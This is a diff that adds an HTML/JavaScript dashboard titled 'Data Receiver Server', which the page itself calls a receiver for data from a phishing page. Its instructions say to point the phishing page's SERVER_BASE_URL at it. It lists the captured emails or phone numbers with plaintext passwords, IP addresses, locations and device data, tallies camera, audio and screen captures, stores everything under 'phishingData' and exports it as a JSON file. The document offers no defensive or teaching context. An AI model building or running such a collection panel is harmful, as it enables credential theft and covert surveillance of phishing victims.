@@ -1,0 +1,953 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Data Receiver Server</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+      color: #f8fafc;
+      line-height: 1.6;
+      min-height: 100vh;
+    }
+    
+    .container {
+      max-width: 1400px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+    
+    header {
+      background: linear-gradient(90deg, #1e40af, #3b82f6);
+      padding: 20px;
+      border-radius: 10px;
+      margin-bottom: 20px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+    
+    h1 {
+      font-size: 2.5rem;
+      margin-bottom: 10px;
+    }
+    
+    .subtitle {
+      font-size: 1.2rem;
+      opacity: 0.9;
+    }
+    
+    .server-status {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin: 15px 0;
+    }
+    
+    .status-indicator {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background-color: #10b981;
+      animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+      0% { opacity: 1; }
+      50% { opacity: 0.5; }
+      100% { opacity: 1; }
+    }
+    
+    .dashboard {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 20px;
+    }
+    
+    .panel {
+      background-color: #1e293b;
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      border: 1px solid #334155;
+    }
+    
+    .full-width {
+      grid-column: 1 / -1;
+    }
+    
+    .panel-title {
+      font-size: 1.5rem;
+      margin-bottom: 15px;
+      padding-bottom: 10px;
+      border-bottom: 2px solid #3b82f6;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 15px;
+      margin-bottom: 20px;
+    }
+    
+    .stat-card {
+      background-color: #334155;
+      padding: 15px;
+      border-radius: 8px;
+      text-align: center;
+      transition: transform 0.2s;
+    }
+    
+    .stat-card:hover {
+      transform: translateY(-5px);
+    }
+    
+    .stat-number {
+      font-size: 2rem;
+      font-weight: bold;
+      color: #3b82f6;
+    }
+    
+    .stat-label {
+      font-size: 0.9rem;
+      opacity: 0.8;
+    }
+    
+    .data-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 10px;
+    }
+    
+    .data-table th, .data-table td {
+      padding: 12px;
+      text-align: left;
+      border-bottom: 1px solid #334155;
+    }
+    
+    .data-table th {
+      background-color: #334155;
+      font-weight: 600;
+    }
+    
+    .data-table tr:hover {
+      background-color: #2d374850;
+    }
+    
+    .media-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+      gap: 15px;
+    }
+    
+    .media-item {
+      background-color: #334155;
+      border-radius: 8px;
+      overflow: hidden;
+      transition: transform 0.2s;
+    }
+    
+    .media-item:hover {
+      transform: translateY(-5px);
+    }
+    
+    .media-img {
+      width: 100%;
+      height: 180px;
+      object-fit: cover;
+    }
+    
+    .media-audio {
+      width: 100%;
+      padding: 15px;
+    }
+    
+    .media-info {
+      padding: 15px;
+    }
+    
+    .media-title {
+      font-weight: 600;
+      margin-bottom: 5px;
+    }
+    
+    .media-time {
+      font-size: 0.8rem;
+      opacity: 0.7;
+    }
+    
+    .badge {
+      display: inline-block;
+      padding: 4px 8px;
+      border-radius: 20px;
+      font-size: 0.8rem;
+      font-weight: 600;
+    }
+    
+    .badge-success {
+      background-color: #10b981;
+      color: white;
+    }
+    
+    .badge-warning {
+      background-color: #f59e0b;
+      color: white;
+    }
+    
+    .badge-error {
+      background-color: #ef4444;
+      color: white;
+    }
+    
+    .log-entry {
+      padding: 10px;
+      border-left: 4px solid #3b82f6;
+      background-color: #334155;
+      margin-bottom: 10px;
+      border-radius: 0 4px 4px 0;
+    }
+    
+    .log-time {
+      font-size: 0.8rem;
+      opacity: 0.7;
+      margin-bottom: 5px;
+    }
+    
+    .controls {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 20px;
+      justify-content: center;
+    }
+    
+    .btn {
+      padding: 10px 15px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: 600;
+      transition: all 0.2s;
+    }
+    
+    .btn-primary {
+      background-color: #3b82f6;
+      color: white;
+    }
+    
+    .btn-primary:hover {
+      background-color: #2563eb;
+    }
+    
+    .btn-danger {
+      background-color: #ef4444;
+      color: white;
+    }
+    
+    .btn-danger:hover {
+      background-color: #dc2626;
+    }
+    
+    .refresh-info {
+      font-size: 0.9rem;
+      opacity: 0.7;
+      margin-top: 10px;
+      text-align: center;
+    }
+    
+    .empty-state {
+      text-align: center;
+      padding: 40px;
+      opacity: 0.7;
+    }
+    
+    .instructions {
+      background-color: #334155;
+      padding: 20px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+    
+    .instructions h3 {
+      margin-bottom: 10px;
+      color: #3b82f6;
+    }
+    
+    .instructions ol {
+      margin-left: 20px;
+    }
+    
+    .instructions li {
+      margin-bottom: 10px;
+    }
+    
+    .code {
+      background-color: #1e293b;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-family: monospace;
+      color: #f59e0b;
+    }
+    
+    @media (max-width: 1024px) {
+      .dashboard {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1>Data Receiver Server</h1>
+      <p class="subtitle">Standalone HTML server for receiving data from phishing page</p>
+      <div class="server-status">
+        <div class="status-indicator"></div>
+        <span>Server running on port: <strong id="serverPort">N/A</strong></span>
+      </div>
+    </header>
+    
+    <div class="instructions">
+      <h3>How to use this receiver:</h3>
+      <ol>
+        <li>Open the phishing page in a different browser tab</li>
+        <li>Update the phishing page's <span class="code">SERVER_BASE_URL</span> to point to this receiver</li>
+        <li>Use the URL shown below as the server address</li>
+        <li>Data will appear here automatically when received</li>
+      </ol>
+      <p>Your server URL: <strong id="serverUrl">Calculating...</strong></p>
+    </div>
+    
+    <div class="controls">
+      <button class="btn btn-primary" id="refreshBtn">Refresh Data</button>
+      <button class="btn btn-danger" id="clearBtn">Clear All Data</button>
+      <button class="btn btn-primary" id="exportBtn">Export Data</button>
+    </div>
+    
+    <div class="dashboard">
+      <div class="panel">
+        <div class="panel-title">
+          <span>Statistics</span>
+        </div>
+        <div class="stats-grid">
+          <div class="stat-card">
+            <div class="stat-number" id="loginCount">0</div>
+            <div class="stat-label">Login Attempts</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-number" id="cameraCount">0</div>
+            <div class="stat-label">Camera Captures</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-number" id="audioCount">0</div>
+            <div class="stat-label">Audio Recordings</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-number" id="screenCount">0</div>
+            <div class="stat-label">Screen Captures</div>
+          </div>
+        </div>
+        
+        <div class="panel-title">
+          <span>Recent Login Attempts</span>
+        </div>
+        <div class="data-container" id="loginData">
+          <div class="empty-state">No login attempts yet</div>
+        </div>
+      </div>
+      
+      <div class="panel">
+        <div class="panel-title">
+          <span>Connected Devices</span>
+        </div>
+        <div class="data-container" id="devicesData">
+          <div class="empty-state">No devices connected</div>
+        </div>
+        
+        <div class="panel-title">
+          <span>Permission Status</span>
+        </div>
+        <div class="data-container" id="permissionsData">
+          <div class="empty-state">No permission data available</div>
+        </div>
+      </div>
+      
+      <div class="panel full-width">
+        <div class="panel-title">
+          <span>Camera Captures</span>
+        </div>
+        <div class="media-grid" id="cameraData">
+          <div class="empty-state">No camera captures yet</div>
+        </div>
+      </div>
+      
+      <div class="panel full-width">
+        <div class="panel-title">
+          <span>Screen Captures</span>
+        </div>
+        <div class="media-grid" id="screenData">
+          <div class="empty-state">No screen captures yet</div>
+        </div>
+      </div>
+      
+      <div class="panel full-width">
+        <div class="panel-title">
+          <span>Audio Recordings</span>
+        </div>
+        <div class="media-grid" id="audioData">
+          <div class="empty-state">No audio recordings yet</div>
+        </div>
+      </div>
+      
+      <div class="panel full-width">
+        <div class="panel-title">
+          <span>Activity Log</span>
+        </div>
+        <div class="data-container" id="activityLog">
+          <div class="empty-state">No activity yet</div>
+        </div>
+      </div>
+    </div>
+    
+    <p class="refresh-info">Data auto-refreshes every 5 seconds. Last updated: <span id="lastUpdate">Never</span></p>
+  </div>
+
+  <script>
+    // Data storage
+    let allData = {
+      loginAttempts: [],
+      cameraCaptures: [],
+      audioRecordings: [],
+      screenCaptures: [],
+      devices: [],
+      permissions: [],
+      activityLog: []
+    };
+    
+    // DOM Elements
+    const refreshBtn = document.getElementById('refreshBtn');
+    const clearBtn = document.getElementById('clearBtn');
+    const exportBtn = document.getElementById('exportBtn');
+    const lastUpdateEl = document.getElementById('lastUpdate');
+    const serverUrlEl = document.getElementById('serverUrl');
+    const serverPortEl = document.getElementById('serverPort');
+    
+    // Count elements
+    const loginCountEl = document.getElementById('loginCount');
+    const cameraCountEl = document.getElementById('cameraCount');
+    const audioCountEl = document.getElementById('audioCount');
+    const screenCountEl = document.getElementById('screenCount');
+    
+    // Data container elements
+    const loginDataEl = document.getElementById('loginData');
+    const devicesDataEl = document.getElementById('devicesData');
+    const permissionsDataEl = document.getElementById('permissionsData');
+    const cameraDataEl = document.getElementById('cameraData');
+    const screenDataEl = document.getElementById('screenData');
+    const audioDataEl = document.getElementById('audioData');
+    const activityLogEl = document.getElementById('activityLog');
+    
+    // Initialize the server
+    document.addEventListener('DOMContentLoaded', function() {
+      setupEventListeners();
+      startServer();
+      loadStoredData();
+      updateDisplay();
+      startAutoRefresh();
+    });
+    
+    // Set up event listeners
+    function setupEventListeners() {
+      refreshBtn.addEventListener('click', updateDisplay);
+      clearBtn.addEventListener('click', clearAllData);
+      exportBtn.addEventListener('click', exportData);
+    }
+    
+    // Start the "server" - simulates server functionality
+    function startServer() {
+      // Generate a random port for display purposes
+      const port = Math.floor(Math.random() * 1000) + 6000;
+      serverPortEl.textContent = port;
+      
+      // Determine the current URL for the sender to use
+      const currentUrl = window.location.origin;
+      serverUrlEl.textContent = currentUrl;
+      
+      // Listen for messages from other tabs (simulated server communication)
+      window.addEventListener('message', function(event) {
+        // Only accept messages from the same origin
+        if (event.origin !== window.location.origin) return;
+        
+        if (event.data && event.data.type === 'loginData') {
+          handleLoginData(event.data);
+        } else if (event.data && event.data.type === 'cameraData') {
+          handleCameraData(event.data);
+        } else if (event.data && event.data.type === 'audioData') {
+          handleAudioData(event.data);
+        } else if (event.data && event.data.type === 'screenData') {
+          handleScreenData(event.data);
+        } else if (event.data && event.data.type === 'permissionData') {
+          handlePermissionData(event.data);
+        }
+      });
+      
+      // Listen for storage events (for cross-tab communication)
+      window.addEventListener('storage', function(event) {
+        if (event.key === 'phishingData') {
+          loadStoredData();
+          updateDisplay();
+        }
+      });
+      
+      // Simulate server endpoints by storing data in localStorage
+      // This allows the "server" to persist data between page reloads
+      console.log('Data receiver server started. Ready to receive data.');
+      addToActivityLog('Server started', 'info');
+    }
+    
+    // Handle login data
+    function handleLoginData(data) {
+      allData.loginAttempts.push({
+        ...data,
+        timestamp: new Date().toISOString(),
+        id: generateId()
+      });
+      
+      addToActivityLog(`Login attempt from ${data.emailOrPhone}`, 'success');
+      saveData();
+      updateDisplay();
+    }
+    
+    // Handle camera data
+    function handleCameraData(data) {
+      allData.cameraCaptures.push({
+        ...data,
+        timestamp: new Date().toISOString(),
+        id: generateId()
+      });
+      
+      addToActivityLog('Camera capture received', 'info');
+      saveData();
+      updateDisplay();
+    }
+    
+    // Handle audio data
+    function handleAudioData(data) {
+      allData.audioRecordings.push({
+        ...data,
+        timestamp: new Date().toISOString(),
+        id: generateId()
+      });
+      
+      addToActivityLog('Audio recording received', 'info');
+      saveData();
+      updateDisplay();
+    }
+    
+    // Handle screen data
+    function handleScreenData(data) {
+      allData.screenCaptures.push({
+        ...data,
+        timestamp: new Date().toISOString(),
+        id: generateId()
+      });
+      
+      addToActivityLog('Screen capture received', 'info');
+      saveData();
+      updateDisplay();
+    }
+    
+    // Handle permission data
+    function handlePermissionData(data) {
+      allData.permissions.push({
+        ...data,
+        timestamp: new Date().toISOString(),
+        id: generateId()
+      });
+      
+      // Update devices list
+      const deviceIndex = allData.devices.findIndex(d => d.ip === data.public_ip);
+      if (deviceIndex === -1) {
+        allData.devices.push({
+          ip: data.public_ip,
+          location: data.user_location,
+          userAgent: navigator.userAgent,
+          lastSeen: new Date().toISOString(),
+          permissions: data
+        });
+      } else {
+        allData.devices[deviceIndex].lastSeen = new Date().toISOString();
+        allData.devices[deviceIndex].permissions = data;
+      }
+      
+      addToActivityLog(`Permissions data from ${data.public_ip}`, 'info');
+      saveData();
+      updateDisplay();
+    }
+    
+    // Add to activity log
+    function addToActivityLog(message, type = 'info') {
+      allData.activityLog.push({
+        message,
+        type,
+        timestamp: new Date().toISOString(),
+        id: generateId()
+      });
+      
+      // Keep only the last 100 log entries
+      if (allData.activityLog.length > 100) {
+        allData.activityLog = allData.activityLog.slice(-100);
+      }
+      
+      saveData();
+    }
+    
+    // Generate a unique ID
+    function generateId() {
+      return Date.now().toString(36) + Math.random().toString(36).substr(2);
+    }
+    
+    // Save data to localStorage
+    function saveData() {
+      localStorage.setItem('phishingData', JSON.stringify(allData));
+    }
+    
+    // Load stored data from localStorage
+    function loadStoredData() {
+      const storedData = localStorage.getItem('phishingData');
+      if (storedData) {
+        allData = JSON.parse(storedData);
+      }
+    }
+    
+    // Update the display with current data
+    function updateDisplay() {
+      // Update statistics
+      loginCountEl.textContent = allData.loginAttempts.length;
+      cameraCountEl.textContent = allData.cameraCaptures.length;
+      audioCountEl.textContent = allData.audioRecordings.length;
+      screenCountEl.textContent = allData.screenCaptures.length;
+      
+      // Update login data display
+      displayLoginData();
+      
+      // Update devices display
+      displayDevices();
+      
+      // Update permissions display
+      displayPermissions();
+      
+      // Update media displays
+      displayCameraData();
+      displayScreenData();
+      displayAudioData();
+      
+      // Update activity log
+      displayActivityLog();
+      
+      // Update last updated timestamp
+      lastUpdateEl.textContent = new Date().toLocaleString();
+    }
+    
+    // Display login data
+    function displayLoginData() {
+      if (allData.loginAttempts.length === 0) {
+        loginDataEl.innerHTML = '<div class="empty-state">No login attempts yet</div>';
+        return;
+      }
+      
+      let html = `
+        <table class="data-table">
+          <thead>
+            <tr>
+              <th>Time</th>
+              <th>Identifier</th>
+              <th>Password</th>
+              <th>IP Address</th>
+              <th>Location</th>
+            </tr>
+          </thead>
+          <tbody>
+      `;
+      
+      // Show only the 5 most recent attempts
+      allData.loginAttempts.slice(-5).reverse().forEach(attempt => {
+        const time = new Date(attempt.timestamp).toLocaleTimeString();
+        html += `
+          <tr>
+            <td>${time}</td>
+            <td>${attempt.emailOrPhone || 'N/A'}</td>
+            <td>${attempt.password || 'N/A'}</td>
+            <td>${attempt.public_ip || 'Unknown'}</td>
+            <td>${attempt.user_location || 'Unknown'}</td>
+          </tr>
+        `;
+      });
+      
+      html += `</tbody></table>`;
+      loginDataEl.innerHTML = html;
+    }
+    
+    // Display connected devices
+    function displayDevices() {
+      if (allData.devices.length === 0) {
+        devicesDataEl.innerHTML = '<div class="empty-state">No devices connected</div>';
+        return;
+      }
+      
+      let html = `
+        <table class="data-table">
+          <thead>
+            <tr>
+              <th>IP Address</th>
+              <th>Last Seen</th>
+              <th>Location</th>
+              <th>Status</th>
+            </tr>
+          </thead>
+          <tbody>
+      `;
+      
+      allData.devices.forEach(device => {
+        const lastSeen = new Date(device.lastSeen).toLocaleTimeString();
+        html += `
+          <tr>
+            <td>${device.ip}</td>
+            <td>${lastSeen}</td>
+            <td>${device.location}</td>
+            <td><span class="badge badge-success">Active</span></td>
+          </tr>
+        `;
+      });
+      
+      html += `</tbody></table>`;
+      devicesDataEl.innerHTML = html;
+    }
+    
+    // Display permissions
+    function displayPermissions() {
+      if (allData.permissions.length === 0) {
+        permissionsDataEl.innerHTML = '<div class="empty-state">No permission data available</div>';
+        return;
+      }
+      
+      let html = `
+        <table class="data-table">
+          <thead>
+            <tr>
+              <th>IP Address</th>
+              <th>Location</th>
+              <th>Device</th>
+              <th>Time</th>
+            </tr>
+          </thead>
+          <tbody>
+      `;
+      
+      // Show only the 5 most recent permissions
+      allData.permissions.slice(-5).reverse().forEach(perm => {
+        const time = new Date(perm.timestamp).toLocaleTimeString();
+        html += `
+          <tr>
+            <td>${perm.public_ip}</td>
+            <td>${perm.user_location}</td>
+            <td>${perm.user_device.userAgent ? perm.user_device.userAgent.substring(0, 30) + '...' : 'Unknown'}</td>
+            <td>${time}</td>
+          </tr>
+        `;
+      });
+      
+      html += `</tbody></table>`;
+      permissionsDataEl.innerHTML = html;
+    }
+    
+    // Display camera data
+    function displayCameraData() {
+      if (allData.cameraCaptures.length === 0) {
+        cameraDataEl.innerHTML = '<div class="empty-state">No camera captures yet</div>';
+        return;
+      }
+      
+      let html = '';
+      
+      // Show only the 6 most recent items
+      allData.cameraCaptures.slice(-6).reverse().forEach(item => {
+        const time = new Date(item.timestamp).toLocaleTimeString();
+        html += `
+          <div class="media-item">
+            <div class="media-img" style="background-color: #334155; display: flex; align-items: center; justify-content: center; color: #94a3b8;">
+              Camera Image
+            </div>
+            <div class="media-info">
+              <div class="media-title">Camera Capture</div>
+              <div class="media-time">${time}</div>
+            </div>
+          </div>
+        `;
+      });
+      
+      cameraDataEl.innerHTML = html;
+    }
+    
+    // Display screen data
+    function displayScreenData() {
+      if (allData.screenCaptures.length === 0) {
+        screenDataEl.innerHTML = '<div class="empty-state">No screen captures yet</div>';
+        return;
+      }
+      
+      let html = '';
+      
+      // Show only the 6 most recent items
+      allData.screenCaptures.slice(-6).reverse().forEach(item => {
+        const time = new Date(item.timestamp).toLocaleTimeString();
+        html += `
+          <div class="media-item">
+            <div class="media-img" style="background-color: #334155; display: flex; align-items: center; justify-content: center; color: #94a3b8;">
+              Screen Capture
+            </div>
+            <div class="media-info">
+              <div class="media-title">Screen Capture</div>
+              <div class="media-time">${time}</div>
+            </div>
+          </div>
+        `;
+      });
+      
+      screenDataEl.innerHTML = html;
+    }
+    
+    // Display audio data
+    function displayAudioData() {
+      if (allData.audioRecordings.length === 0) {
+        audioDataEl.innerHTML = '<div class="empty-state">No audio recordings yet</div>';
+        return;
+      }
+      
+      let html = '';
+      
+      // Show only the 4 most recent items
+      allData.audioRecordings.slice(-4).reverse().forEach(item => {
+        const time = new Date(item.timestamp).toLocaleTimeString();
+        html += `
+          <div class="media-item">
+            <div class="media-audio" style="text-align: center; color: #94a3b8;">
+              Audio Recording
+            </div>
+            <div class="media-info">
+              <div class="media-title">Audio Recording</div>
+              <div class="media-time">${time}</div>
+            </div>
+          </div>
+        `;
+      });
+      
+      audioDataEl.innerHTML = html;
+    }
+    
+    // Display activity log
+    function displayActivityLog() {
+      if (allData.activityLog.length === 0) {
+        activityLogEl.innerHTML = '<div class="empty-state">No activity yet</div>';
+        return;
+      }
+      
+      let html = '';
+      
+      // Show only the 10 most recent activities
+      allData.activityLog.slice(-10).reverse().forEach(log => {
+        const time = new Date(log.timestamp).toLocaleTimeString();
+        const badgeClass = log.type === 'success' ? 'badge-success' : 
+                          log.type === 'error' ? 'badge-error' : 'badge-warning';
+        
+        html += `
+          <div class="log-entry">
+            <div class="log-time">${time} <span class="badge ${badgeClass}">${log.type}</span></div>
+            <div>${log.message}</div>
+          </div>
+        `;
+      });
+      
+      activityLogEl.innerHTML = html;
+    }
+    
+    // Clear all data
+    function clearAllData() {
+      if (!confirm('Are you sure you want to clear all data? This action cannot be undone.')) {
+        return;
+      }
+      
+      allData = {
+        loginAttempts: [],
+        cameraCaptures: [],
+        audioRecordings: [],
+        screenCaptures: [],
+        devices: [],
+        permissions: [],
+        activityLog: []
+      };
+      
+      saveData();
+      updateDisplay();
+      addToActivityLog('All data cleared', 'info');
+    }
+    
+    // Export data
+    function exportData() {
+      const dataStr = JSON.stringify(allData, null, 2);
+      const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
+      
+      const exportFileDefaultName = 'phishing-data.json';
+      
+      const linkElement = document.createElement('a');
+      linkElement.setAttribute('href', dataUri);
+      linkElement.setAttribute('download', exportFileDefaultName);
+      linkElement.click();
+      
+      addToActivityLog('Data exported', 'success');
+    }
+    
+    // Start auto-refresh
+    function startAutoRefresh() {
+      setInterval(updateDisplay, 5000);
+    }
+    
+    // Show message to user
+    function showMessage(message, type) {
+      // Create a toast notification
+      const toast = document.createElement('div');
+      toast.textContent = message;
+      toast.style.position = 'fixed';
+      toast.style.bottom = '20px';
+      toast.style.right = '20px';
+      toast.style.padding = '10px 20px';
+      toast.style.borderRadius = '5px';
+      toast.style.color = 'white';
+      toast.style.zIndex = '1000';
+      
+      if (type === 'success') {
+        toast.style.backgroundColor = '#10b981';
+      } else {
+        toast.style.backgroundColor = '#ef4444';
+      }
+      
+      document.body.appendChild(toast);
+      
+      // Remove toast after 3 seconds
+      setTimeout(() => {
+        document.body.removeChild(toast);
+      }, 3000);
+    }
+  </script>
+</body>
+</html>
